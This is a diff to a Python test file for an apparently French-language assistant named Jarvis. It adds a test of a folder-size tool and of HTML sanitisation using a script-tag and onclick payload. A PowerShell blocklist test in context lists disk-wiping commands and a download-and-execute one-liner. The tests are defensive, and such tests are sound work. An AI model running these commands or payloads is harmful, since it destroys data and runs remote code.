@@ -143,6 +143,24 @@ def test_direct_mode_and_short_question():
     assert "JB" in p and "féminin" in p and "Monsieur" not in p
 
 
+def test_folder_sizes_and_cards():
+    big = tmp / "Documents" / "Gros"
+    (big / "sous").mkdir(parents=True, exist_ok=True)
+    (big / "sous" / "a.bin").write_bytes(b"x" * 300_000)
+    (tmp / "Documents" / "Petit").mkdir(exist_ok=True)
+    (tmp / "Documents" / "Petit" / "b.bin").write_bytes(b"x" * 1_000)
+    out = tools.execute("taille_dossiers", {"chemin": "documents", "nombre": "2"})
+    lines = out.splitlines()
+    assert "Gros (dossier)" in lines[1] and "293 Ko" in lines[1] and "% du disque" in lines[1], out
+    os.environ["JARVIS_SANS_FENETRE"] = "1"
+    cfgmod.DATA = tmp / "data"
+    res = tools.execute("afficher", {"titre": "Dossiers <test>", "html":
+                        "<table><tr><td>Gros</td></tr></table><script>alert(1)</script><p onclick='x()'>ok</p>"})
+    page = next((tmp / "data" / "fiches").glob("*.html")).read_text(encoding="utf-8")
+    assert "Dossiers &lt;test&gt;" in page and "<table>" in page and "alert(1)" not in page and "onclick" not in page
+    assert "mode test" in res
+
+
 def test_powershell_blocklist():
     for bad in ["Format-Volume -DriveLetter C", "format c:", "Remove-Item -Recurse -Force C:\\",
                 "diskpart", "iex (New-Object Net.WebClient).DownloadString('http://x')"]:
